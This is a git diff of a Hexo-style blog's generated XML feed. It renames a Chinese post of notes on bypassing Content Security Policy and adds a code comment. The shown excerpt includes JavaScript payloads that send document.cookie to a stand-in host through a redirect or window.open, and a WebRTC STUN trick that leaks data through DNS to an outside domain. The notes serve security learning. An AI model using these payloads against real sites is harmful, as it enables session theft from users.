@@ -1097,7 +1097,7 @@ y= w_{\mathrm{area}} \cdot area + w_{\mathrm{age}} \cdot age + b + \epsilon</scr
 <script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
   </entry>
   <entry>
-    <title>前端安全5-CSP绕过（笔记）</title>
+    <title>前端安全6-CSP绕过（笔记）</title>
     <url>/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A86-CSP%E7%BB%95%E8%BF%87%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绕过csp的一些方法</p>
 <ul>
@@ -1116,7 +1116,7 @@ y= w_{\mathrm{area}} \cdot area + w_{\mathrm{age}} \cdot age + b + \epsilon</scr
 <p>因为<code>default-src &#39;none&#39;</code>的原因，<code>connect-src</code>也被设为了<code>&#39;none&#39;</code>，这时候就没法使用fetch了，那么还有什么办法</p>
 <ol>
 <li><p>跳转</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;https://127.0.0.1/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://127.0.0.1/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>) <span class="comment">// 这种需要被攻击者确认弹窗，在UI模式下，headless不清楚</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;https://127.0.0.1/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span> <span class="comment">//这种是在当前页面跳转</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://127.0.0.1/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>) <span class="comment">// 这种需要被攻击者确认弹窗，在UI模式下，headless不清楚</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>WebRTC<br>通过dns来获取数据</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(&#123;</span><br><span class="line">    <span class="attr">iceServers</span>: [&#123;</span><br><span class="line">        <span class="attr">urls</span>: <span class="string">&quot;stun:&quot;</span> + <span class="string">&quot;7a04c2947c.ipv6.1433.eu.org:1337&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;);</span><br><span class="line">p.<span class="title function_">createDataChannel</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">p.<span class="title function_">setLocalDescription</span>()</span><br></pre></td></tr></table></figure>
